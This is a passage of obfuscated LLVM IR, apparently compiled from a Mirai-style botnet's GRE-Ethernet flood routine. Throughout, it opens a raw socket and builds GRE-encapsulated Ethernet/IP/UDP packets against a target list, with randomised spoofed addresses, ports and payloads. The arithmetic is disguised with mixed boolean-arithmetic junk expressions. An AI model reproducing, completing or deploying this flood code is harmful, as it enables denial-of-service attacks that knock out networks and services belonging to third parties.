  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 1, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 18, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 24, i32 %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* null) #6
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = sub i64 0, %87
  %91 = sub i64 0, %89
  %92 = add i64 %90, %91
  %93 = sub i64 0, %92
  %94 = add nsw i64 %87, %89
  %95 = trunc i64 %93 to i32
  store i32 %95, i32* %24, align 4
  %96 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %96, i32* %12, align 4
  %97 = icmp eq i32 %96, -1
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %5
  br label %620

; <label>:99:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %100 = load i32, i32* %12, align 4
  %101 = bitcast i32* %11 to i8*
  %102 = call i32 @setsockopt(i32 %100, i32 0, i32 3, i8* %101, i32 4) #6
  %103 = icmp eq i32 %102, -1
  br i1 %103, label %104, label %107

; <label>:104:                                    ; preds = %99
  %105 = load i32, i32* %12, align 4
  %106 = call i32 @close(i32 %105)
  br label %620

; <label>:107:                                    ; preds = %99
  store i32 0, i32* %11, align 4
  br label %108

; <label>:108:                                    ; preds = %342, %107
  %109 = load i32, i32* %11, align 4
  %110 = load i8, i8* %7, align 1
  %111 = zext i8 %110 to i32
  %112 = icmp slt i32 %109, %111
  br i1 %112, label %113, label %348

; <label>:113:                                    ; preds = %108
  %114 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %115 = load i8**, i8*** %13, align 8
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds i8*, i8** %115, i64 %117
  store i8* %114, i8** %118, align 8
  %119 = load i8**, i8*** %13, align 8
  %120 = load i32, i32* %11, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds i8*, i8** %119, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = bitcast i8* %123 to %struct.iphdr*
  store %struct.iphdr* %124, %struct.iphdr** %25, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %126 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %125, i64 1
  %127 = bitcast %struct.iphdr* %126 to %struct.grehdr*
  store %struct.grehdr* %127, %struct.grehdr** %26, align 8
  %128 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %129 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %128, i64 1
  %130 = bitcast %struct.grehdr* %129 to %struct.ethhdr*
  store %struct.ethhdr* %130, %struct.ethhdr** %27, align 8
  %131 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %132 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %131, i64 1
  %133 = bitcast %struct.ethhdr* %132 to %struct.iphdr*
  store %struct.iphdr* %133, %struct.iphdr** %28, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i64 1
  %136 = bitcast %struct.iphdr* %135 to %struct.udphdr*
  store %struct.udphdr* %136, %struct.udphdr** %29, align 8
  %137 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %138 = bitcast %struct.iphdr* %137 to i8*
  %139 = load i8, i8* %138, align 4
  %140 = xor i8 15, -1
  %141 = xor i8 %139, %140
  %142 = and i8 %141, %139
  %143 = and i8 %139, 15
  %144 = xor i8 %142, -1
  %145 = xor i8 64, -1
  %146 = xor i8 19, -1
  %147 = and i8 %144, 19
  %148 = and i8 %142, %146
  %149 = and i8 %145, 19
  %150 = and i8 64, %146
  %151 = or i8 %147, %148
  %152 = or i8 %149, %150
  %153 = xor i8 %151, %152
  %154 = or i8 %144, %145
  %155 = xor i8 %154, -1
  %156 = or i8 19, %146
  %157 = and i8 %155, %156
  %158 = or i8 %153, %157
  %159 = or i8 %142, 64
  store i8 %158, i8* %138, align 4
  %160 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %161 = bitcast %struct.iphdr* %160 to i8*
  %162 = load i8, i8* %161, align 4
  %163 = xor i8 %162, -1
  %164 = xor i8 -16, -1
  %165 = xor i8 126, -1
  %166 = or i8 %163, %164
  %167 = or i8 126, %165
  %168 = xor i8 %166, -1
  %169 = and i8 %168, %167
  %170 = and i8 %162, -16
  %171 = xor i8 %169, -1
  %172 = xor i8 5, -1
  %173 = xor i8 -115, -1
  %174 = and i8 %171, -115
  %175 = and i8 %169, %173
  %176 = and i8 %172, -115
  %177 = and i8 5, %173
  %178 = or i8 %174, %175
  %179 = or i8 %176, %177
  %180 = xor i8 %178, %179
  %181 = or i8 %171, %172
  %182 = xor i8 %181, -1
  %183 = or i8 -115, %173
  %184 = and i8 %182, %183
  %185 = or i8 %180, %184
  %186 = or i8 %169, 5
  store i8 %185, i8* %161, align 4
  %187 = load i8, i8* %14, align 1
  %188 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %189 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %188, i32 0, i32 1
  store i8 %187, i8* %189, align 1
  %190 = load i32, i32* %20, align 4
  %191 = sext i32 %190 to i64
  %192 = add i64 66, 6195047601895067214
  %193 = add i64 %192, %191
  %194 = sub i64 %193, 6195047601895067214
  %195 = add i64 66, %191
  %196 = trunc i64 %194 to i16
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 2
  store i16 %197, i16* %199, align 2
  %200 = load i16, i16* %15, align 2
  %201 = call zeroext i16 @htons(i16 zeroext %200) #7
  %202 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 3
  store i16 %201, i16* %203, align 4
  %204 = load i8, i8* %16, align 1
  %205 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 5
  store i8 %204, i8* %206, align 4
  %207 = load i8, i8* %17, align 1
  %208 = icmp ne i8 %207, 0
  br i1 %208, label %209, label %213

; <label>:209:                                    ; preds = %113
  %210 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %211 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 4
  store i16 %210, i16* %212, align 2
  br label %213

; <label>:213:                                    ; preds = %209, %113
  %214 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 6
  store i8 47, i8* %215, align 1
  %216 = load i32, i32* %23, align 4
  %217 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 8
  store i32 %216, i32* %218, align 4
  %219 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %220 = load i32, i32* %11, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %219, i64 %221
  %223 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %222, i32 0, i32 1
  %224 = load i32, i32* %223, align 4
  %225 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 9
  store i32 %224, i32* %226, align 4
  %227 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %228 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %229 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %228, i32 0, i32 1
  store i16 %227, i16* %229, align 2
  %230 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %231 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %232 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %231, i32 0, i32 2
  store i16 %230, i16* %232, align 1
  %233 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %234 = bitcast %struct.iphdr* %233 to i8*
  %235 = load i8, i8* %234, align 4
  %236 = xor i8 %235, -1
  %237 = xor i8 15, -1
  %238 = xor i8 -98, -1
  %239 = or i8 %236, %237
  %240 = or i8 -98, %238
  %241 = xor i8 %239, -1
  %242 = and i8 %241, %240
  %243 = and i8 %235, 15
  %244 = and i8 %242, 64
  %245 = xor i8 %242, 64
  %246 = or i8 %244, %245
  %247 = or i8 %242, 64
  store i8 %246, i8* %234, align 4
  %248 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %249 = bitcast %struct.iphdr* %248 to i8*
  %250 = load i8, i8* %249, align 4
  %251 = xor i8 -16, -1
  %252 = xor i8 %250, %251
  %253 = and i8 %252, %250
  %254 = and i8 %250, -16
  %255 = and i8 %253, 5
  %256 = xor i8 %253, 5
  %257 = or i8 %255, %256
  %258 = or i8 %253, 5
  store i8 %257, i8* %249, align 4
  %259 = load i8, i8* %14, align 1
  %260 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 1
  store i8 %259, i8* %261, align 1
  %262 = load i32, i32* %20, align 4
  %263 = sext i32 %262 to i64
  %264 = add i64 28, -384753191391622092
  %265 = add i64 %264, %263
  %266 = sub i64 %265, -384753191391622092
  %267 = add i64 28, %263
  %268 = trunc i64 %266 to i16
  %269 = call zeroext i16 @htons(i16 zeroext %268) #7
  %270 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %271 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %270, i32 0, i32 2
  store i16 %269, i16* %271, align 2
  %272 = load i16, i16* %15, align 2
  %273 = zext i16 %272 to i32
  %274 = xor i32 %273, -1
  %275 = and i32 -1, %274
  %276 = xor i32 -1, -1
  %277 = and i32 %273, %276
  %278 = or i32 %275, %277
  %279 = xor i32 %273, -1
  %280 = trunc i32 %278 to i16
  %281 = call zeroext i16 @htons(i16 zeroext %280) #7
  %282 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 3
  store i16 %281, i16* %283, align 4
  %284 = load i8, i8* %16, align 1
  %285 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 5
  store i8 %284, i8* %286, align 4
  %287 = load i8, i8* %17, align 1
  %288 = icmp ne i8 %287, 0
  br i1 %288, label %289, label %293

; <label>:289:                                    ; preds = %213
  %290 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %291 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i32 0, i32 4
  store i16 %290, i16* %292, align 2
  br label %293

; <label>:293:                                    ; preds = %289, %213
  %294 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 6
  store i8 17, i8* %295, align 1
  %296 = call i32 @rand_next()
  %297 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 8
  store i32 %296, i32* %298, align 4
  %299 = load i8, i8* %22, align 1
  %300 = icmp ne i8 %299, 0
  br i1 %300, label %301, label %307

; <label>:301:                                    ; preds = %293
  %302 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %303 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %302, i32 0, i32 9
  %304 = load i32, i32* %303, align 4
  %305 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 9
  store i32 %304, i32* %306, align 4
  br label %322

; <label>:307:                                    ; preds = %293
  %308 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i32 0, i32 8
  %310 = load i32, i32* %309, align 4
  %311 = sub i32 0, 1024
  %312 = add i32 %310, %311
  %313 = sub i32 %310, 1024
  %314 = xor i32 %312, -1
  %315 = and i32 -1, %314
  %316 = xor i32 -1, -1
  %317 = and i32 %312, %316
  %318 = or i32 %315, %317
  %319 = xor i32 %312, -1
  %320 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %321 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %320, i32 0, i32 9
  store i32 %318, i32* %321, align 4
  br label %322

; <label>:322:                                    ; preds = %307, %301
  %323 = load i16, i16* %18, align 2
  %324 = call zeroext i16 @htons(i16 zeroext %323) #7
  %325 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %326 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %325, i32 0, i32 0
  store i16 %324, i16* %326, align 2
  %327 = load i16, i16* %19, align 2
  %328 = call zeroext i16 @htons(i16 zeroext %327) #7
  %329 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %330 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %329, i32 0, i32 1
  store i16 %328, i16* %330, align 2
  %331 = load i32, i32* %20, align 4
  %332 = sext i32 %331 to i64
  %333 = sub i64 0, 8
  %334 = sub i64 0, %332
  %335 = add i64 %333, %334
  %336 = sub i64 0, %335
  %337 = add i64 8, %332
  %338 = trunc i64 %336 to i16
  %339 = call zeroext i16 @htons(i16 zeroext %338) #7
  %340 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %341 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %340, i32 0, i32 2
  store i16 %339, i16* %341, align 2
  br label %342

; <label>:342:                                    ; preds = %322
  %343 = load i32, i32* %11, align 4
  %344 = sub i32 %343, 1926174788
  %345 = add i32 %344, 1
  %346 = add i32 %345, 1926174788
  %347 = add nsw i32 %343, 1
  store i32 %346, i32* %11, align 4
  br label %108

; <label>:348:                                    ; preds = %108
  br label %349

; <label>:349:                                    ; preds = %619, %348
  store i32 0, i32* %11, align 4
  br label %350

; <label>:350:                                    ; preds = %607, %349
  %351 = load i32, i32* %11, align 4
  %352 = load i8, i8* %7, align 1
  %353 = zext i8 %352 to i32
  %354 = icmp slt i32 %351, %353
  br i1 %354, label %355, label %613

; <label>:355:                                    ; preds = %350
  %356 = load i8**, i8*** %13, align 8
  %357 = load i32, i32* %11, align 4
  %358 = sext i32 %357 to i64
  %359 = getelementptr inbounds i8*, i8** %356, i64 %358
  %360 = load i8*, i8** %359, align 8
  store i8* %360, i8** %33, align 8
  %361 = load i8*, i8** %33, align 8
  %362 = bitcast i8* %361 to %struct.iphdr*
  store %struct.iphdr* %362, %struct.iphdr** %34, align 8
  %363 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i64 1
  %365 = bitcast %struct.iphdr* %364 to %struct.grehdr*
  store %struct.grehdr* %365, %struct.grehdr** %35, align 8
  %366 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %367 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %366, i64 1
  %368 = bitcast %struct.grehdr* %367 to %struct.ethhdr*
  store %struct.ethhdr* %368, %struct.ethhdr** %36, align 8
  %369 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %370 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %369, i64 1
  %371 = bitcast %struct.ethhdr* %370 to %struct.iphdr*
  store %struct.iphdr* %371, %struct.iphdr** %37, align 8
  %372 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %373 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %372, i64 1
  %374 = bitcast %struct.iphdr* %373 to %struct.udphdr*
  store %struct.udphdr* %374, %struct.udphdr** %38, align 8
  %375 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %376 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %375, i64 1
  %377 = bitcast %struct.udphdr* %376 to i8*
  store i8* %377, i8** %39, align 8
  %378 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %379 = load i32, i32* %11, align 4
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %378, i64 %380
  %382 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %381, i32 0, i32 2
  %383 = load i8, i8* %382, align 4
  %384 = zext i8 %383 to i32
  %385 = icmp slt i32 %384, 32
  br i1 %385, label %386, label %410

; <label>:386:                                    ; preds = %355
  %387 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %388 = load i32, i32* %11, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %387, i64 %389
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i32 0, i32 1
  %392 = load i32, i32* %391, align 4
  %393 = call i32 @ntohl(i32 %392) #7
  %394 = call i32 @rand_next()
  %395 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %396 = load i32, i32* %11, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i64 %397
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i32 0, i32 2
  %400 = load i8, i8* %399, align 4
  %401 = zext i8 %400 to i32
  %402 = lshr i32 %394, %401
  %403 = add i32 %393, 2075497174
  %404 = add i32 %403, %402
  %405 = sub i32 %404, 2075497174
  %406 = add i32 %393, %402
  %407 = call i32 @htonl(i32 %405) #7
  %408 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %409 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %408, i32 0, i32 9
  store i32 %407, i32* %409, align 4
  br label %410

; <label>:410:                                    ; preds = %386, %355
  %411 = load i32, i32* %23, align 4
  %412 = icmp eq i32 %411, -1
  br i1 %412, label %413, label %417

; <label>:413:                                    ; preds = %410
  %414 = call i32 @rand_next()
  %415 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %416 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %415, i32 0, i32 8
  store i32 %414, i32* %416, align 4
  br label %417

; <label>:417:                                    ; preds = %413, %410
  %418 = load i16, i16* %15, align 2
  %419 = zext i16 %418 to i32
  %420 = icmp eq i32 %419, 65535
  br i1 %420, label %421, label %456

; <label>:421:                                    ; preds = %417
  %422 = call i32 @rand_next()
  %423 = xor i32 %422, -1
  %424 = xor i32 65535, -1
  %425 = xor i32 -1310032765, -1
  %426 = or i32 %423, %424
  %427 = or i32 -1310032765, %425
  %428 = xor i32 %426, -1
  %429 = and i32 %428, %427
  %430 = and i32 %422, 65535
  %431 = trunc i32 %429 to i16
  %432 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %433 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %432, i32 0, i32 3
  store i16 %431, i16* %433, align 4
  %434 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %435 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %434, i32 0, i32 3
  %436 = load i16, i16* %435, align 4
  %437 = zext i16 %436 to i32
  %438 = sub i32 %437, 548458063
  %439 = sub i32 %438, 1000
  %440 = add i32 %439, 548458063
  %441 = sub nsw i32 %437, 1000
  %442 = xor i32 %440, -1
  %443 = and i32 678644517, %442
  %444 = xor i32 678644517, -1
  %445 = and i32 %440, %444
  %446 = xor i32 -1, -1
  %447 = and i32 %446, 678644517
  %448 = and i32 -1, %444
  %449 = or i32 %443, %445
  %450 = or i32 %447, %448
  %451 = xor i32 %449, %450
  %452 = xor i32 %440, -1
  %453 = trunc i32 %451 to i16
  %454 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %455 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %454, i32 0, i32 3
  store i16 %453, i16* %455, align 4
  br label %456

; <label>:456:                                    ; preds = %421, %417
  %457 = load i16, i16* %18, align 2
  %458 = zext i16 %457 to i32
  %459 = icmp eq i32 %458, 65535
  br i1 %459, label %460, label %473

; <label>:460:                                    ; preds = %456
  %461 = call i32 @rand_next()
  %462 = xor i32 %461, -1
  %463 = xor i32 65535, -1
  %464 = xor i32 1911355294, -1
  %465 = or i32 %462, %463
  %466 = or i32 1911355294, %464
  %467 = xor i32 %465, -1
  %468 = and i32 %467, %466
  %469 = and i32 %461, 65535
  %470 = trunc i32 %468 to i16
  %471 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %472 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %471, i32 0, i32 0
  store i16 %470, i16* %472, align 2
  br label %473

; <label>:473:                                    ; preds = %460, %456
  %474 = load i16, i16* %19, align 2
  %475 = zext i16 %474 to i32
  %476 = icmp eq i32 %475, 65535
  br i1 %476, label %477, label %490

; <label>:477:                                    ; preds = %473
  %478 = call i32 @rand_next()
  %479 = xor i32 %478, -1
  %480 = xor i32 65535, -1
  %481 = xor i32 -721341744, -1
  %482 = or i32 %479, %480
  %483 = or i32 -721341744, %481
  %484 = xor i32 %482, -1
  %485 = and i32 %484, %483
  %486 = and i32 %478, 65535
  %487 = trunc i32 %485 to i16
  %488 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %489 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %488, i32 0, i32 1
  store i16 %487, i16* %489, align 2
  br label %490

; <label>:490:                                    ; preds = %477, %473
  %491 = load i8, i8* %22, align 1
  %492 = icmp ne i8 %491, 0
  br i1 %492, label %497, label %493

; <label>:493:                                    ; preds = %490
  %494 = call i32 @rand_next()
  %495 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %496 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %495, i32 0, i32 9
  store i32 %494, i32* %496, align 4
  br label %503

; <label>:497:                                    ; preds = %490
  %498 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %499 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %498, i32 0, i32 9
  %500 = load i32, i32* %499, align 4
  %501 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %502 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %501, i32 0, i32 9
  store i32 %500, i32* %502, align 4
  br label %503

; <label>:503:                                    ; preds = %497, %493
  %504 = call i32 @rand_next()
  store i32 %504, i32* %40, align 4
  %505 = call i32 @rand_next()
  store i32 %505, i32* %41, align 4
  %506 = call i32 @rand_next()
  store i32 %506, i32* %42, align 4
  %507 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %508 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %507, i32 0, i32 0
  %509 = getelementptr inbounds [6 x i8], [6 x i8]* %508, i32 0, i32 0
  %510 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %509, i8* %510, i32 4)
  %511 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %512 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %511, i32 0, i32 1
  %513 = getelementptr inbounds [6 x i8], [6 x i8]* %512, i32 0, i32 0
  %514 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %513, i8* %514, i32 4)
  %515 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %516 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %515, i32 0, i32 0
  %517 = getelementptr inbounds [6 x i8], [6 x i8]* %516, i32 0, i32 0
  %518 = getelementptr inbounds i8, i8* %517, i64 4
  %519 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %518, i8* %519, i32 2)
  %520 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %521 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %520, i32 0, i32 1
  %522 = getelementptr inbounds [6 x i8], [6 x i8]* %521, i32 0, i32 0
  %523 = getelementptr inbounds i8, i8* %522, i64 4
  %524 = bitcast i32* %42 to i8*
  %525 = getelementptr inbounds i8, i8* %524, i64 2
  call void @util_memcpy(i8* %523, i8* %525, i32 2)
  %526 = load i8, i8* %21, align 1
  %527 = icmp ne i8 %526, 0
  br i1 %527, label %528, label %535

; <label>:528:                                    ; preds = %503
  %529 = load i8*, i8** %39, align 8
  %530 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %529, i32 %530)
  %531 = load i8*, i8** %39, align 8
  %532 = load i32, i32* %20, align 4
  %533 = sext i32 %532 to i64
  %534 = getelementptr inbounds i8, i8* %531, i64 %533
  store i8 0, i8* %534, align 1
  br label %535

; <label>:535:                                    ; preds = %528, %503
  %536 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %537 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %536, i32 0, i32 7
  store i16 0, i16* %537, align 2
  %538 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %539 = bitcast %struct.iphdr* %538 to i16*
  %540 = call zeroext i16 @checksum_generic(i16* %539, i32 20)
  %541 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %542 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %541, i32 0, i32 7
  store i16 %540, i16* %542, align 2
  %543 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %544 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %543, i32 0, i32 7
  store i16 0, i16* %544, align 2
  %545 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %546 = bitcast %struct.iphdr* %545 to i16*
  %547 = call zeroext i16 @checksum_generic(i16* %546, i32 20)
  %548 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %549 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %548, i32 0, i32 7
  store i16 %547, i16* %549, align 2
  %550 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %551 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %550, i32 0, i32 3
  store i16 0, i16* %551, align 2
  %552 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %553 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %554 = bitcast %struct.udphdr* %553 to i8*
  %555 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %556 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %555, i32 0, i32 2
  %557 = load i16, i16* %556, align 2
  %558 = load i32, i32* %20, align 4
  %559 = sext i32 %558 to i64
  %560 = sub i64 0, %559
  %561 = sub i64 8, %560
  %562 = add i64 8, %559
  %563 = trunc i64 %561 to i32
  %564 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %552, i8* %554, i16 zeroext %557, i32 %563)
  %565 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %566 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %565, i32 0, i32 3
  store i16 %564, i16* %566, align 2
  %567 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %568 = load i32, i32* %11, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %567, i64 %569
  %571 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %570, i32 0, i32 0
  %572 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %571, i32 0, i32 0
  store i16 2, i16* %572, align 4
  %573 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %574 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %573, i32 0, i32 9
  %575 = load i32, i32* %574, align 4
  %576 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %577 = load i32, i32* %11, align 4
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %576, i64 %578
  %580 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %579, i32 0, i32 0
  %581 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %580, i32 0, i32 2
  %582 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %581, i32 0, i32 0
  store i32 %575, i32* %582, align 4
  %583 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %584 = load i32, i32* %11, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %583, i64 %585
  %587 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %586, i32 0, i32 0
  %588 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %587, i32 0, i32 1
  store i16 0, i16* %588, align 2
  %589 = load i32, i32* %12, align 4
  %590 = load i8*, i8** %33, align 8
  %591 = load i32, i32* %20, align 4
  %592 = sext i32 %591 to i64
  %593 = add i64 66, 2560648052837509911
  %594 = add i64 %593, %592
  %595 = sub i64 %594, 2560648052837509911
  %596 = add i64 66, %592
  %597 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %598 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %599 = load i32, i32* %11, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %598, i64 %600
  %602 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %601, i32 0, i32 0
  %603 = bitcast %struct.sockaddr_in* %602 to %struct.sockaddr*
